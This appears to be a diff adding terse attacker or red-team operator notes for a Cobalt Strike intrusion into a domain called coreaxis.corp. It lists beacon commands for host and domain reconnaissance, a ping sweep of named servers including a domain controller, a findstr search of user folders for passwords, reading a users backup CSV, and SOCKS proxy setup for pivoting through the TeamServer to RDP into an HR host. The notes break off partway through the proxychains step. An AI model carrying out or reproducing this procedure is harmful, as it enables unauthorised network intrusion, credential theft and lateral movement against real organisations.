@@ -1,0 +1,39 @@
+Download the patch file:
+
+exeute and Connect to the C2
+
+powershell tasklist /v
+powershell whoami /all
+powershell ipconfig /all
+powershell net config workstation
+powershell nltest /dsgetdc:coreaxis.corp
+shell net view /domain
+shell net view
+upload dsquery
+shell dsquery.exe computer -limit 0
+
+shell for %i in (CORE-DC FIN01 FILES01 DEV01 HR01 WEBSERVER-TEST SQLSERVER WEBSERVER) do @ping -n 1 %i.coreaxis.corp
+
+findstr /s /i /m /c:"Password" "%USERPROFILE%\Desktop\*.*" "%USERPROFILE%\Documents\*.*" "%USERPROFILE%\Pictures\*.*" "%USERPROFILE%\Downloads\*.*" "%USERPROFILE%\Videos\*.*" "%USERPROFILE%\Music\*.*"
+
+powershell cat C:\Users\john.it\users_backup.csv
+
+
+```
+Windows with Proxifier (GUI way)
+Go to Profile → Proxy Servers → Add
+Address: TEAMSERVER_IP (the public IP of your Cobalt Strike TeamServer)
+Port: 34807
+Protocol: SOCKS4 (or SOCKS5 if you chose that).
+Go to Profile → Proxification Rules → Add
+Application: mstsc.exe
+Action: use the SOCKS proxy.
+Save and enable the rule.
+Option B – Linux / Kali
+Add to /etc/proxychains4.conf:
+```
+
+rdp TO LOCAL THEN RDP FROM THIS TO THE HR01
+
+
+
